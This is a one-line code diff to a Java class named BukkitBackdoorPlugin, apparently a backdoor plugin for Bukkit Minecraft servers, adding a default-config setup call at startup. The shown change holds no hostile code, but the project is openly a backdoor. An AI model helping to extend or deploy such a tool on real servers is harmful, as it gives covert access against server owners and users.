@@ -20,6 +20,7 @@ public class BukkitBackdoorPlugin extends JavaPlugin {
         instance = this;
         Superhead.show();
         configManager = new ConfigManager(this);
+        configManager.setupDefaultConfig();
         listenerManager = new ListenerManager(this);
         listenerManager.registerListeners();
     }
